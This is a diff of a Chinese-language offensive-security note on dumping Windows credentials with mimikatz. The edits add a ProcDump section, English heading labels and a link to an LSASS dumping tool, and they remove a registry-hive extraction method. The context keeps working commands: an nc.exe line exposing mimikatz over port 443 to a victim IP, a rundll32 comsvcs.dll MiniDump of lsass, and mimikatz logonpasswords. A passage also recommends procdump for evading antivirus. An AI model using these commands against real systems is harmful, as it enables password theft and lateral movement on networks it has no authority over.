@@ -125,7 +125,7 @@ vault::cred /patch
 
 ---
 
-## 离线抓取
+## 离线抓取 (lsass dump)
 
 **相关文章**
 - [Win10及2012系统以后的明文抓取方式](https://www.anquanke.com/post/id/175364)
@@ -186,9 +186,11 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 # 192.168.1.2 为 Victim IP
 ```
 
-### 直接转储
+### 直接转储(Task Manager)
 
 在任务管理器找到 lsass.exe，右键创建转储文件
+
+### ProcDump
 
 procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
 ```bash
@@ -207,7 +209,7 @@ sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
 sekurlsa::logonpasswords full
 ```
 
-### comsvcs.dll
+### ComSvcs.dll
 
 使用 `C:\windows\system32\comsvcs.dll` 的导出函数 MiniDump 能够 dump 指定进程的内存文件
 
@@ -220,22 +222,6 @@ sekurlsa::logonpasswords full
 ```powershell
 Get-Process lsass
 powershell -c "rundll32 C:\windows\system32\comsvcs.dll, MiniDump 516 C:\lsass.dmp full"
-```
-
-### sam + mimikatz
-
-> 注意：本地复原机器必须与目标机器一致，且需要在系统权限下执行
-
-从 sam 中提取目标系统用户 hash
-```bash
-reg save HKLM\SYSTEM system.hiv
-reg save HKLM\SAM sam.hiv
-reg save HKLM\SECURITY security.hiv
-```
-
-将上述三个文件复制到攻击机本地，然后使用 mimikatz 获取用户 hash
-```bash
-lsadump::sam /system:system.hiv /sam:sam.hiv /security:security.hiv
 ```
 
 ### windbg 中载入 mimilib 模块
@@ -278,6 +264,10 @@ Bin2Dmp.exe "Windows Server 2008 x64.vmem" win2k8.dmp
 `!mimikatz` 载入 mimikatz
 
 ![](../../../assets/img/Security/安全工具/mimikatz/11.png)
+
+### LSASS Shtinkering
+
+- https://github.com/deepinstinct/Lsass-Shtinkering
 
 ---
 
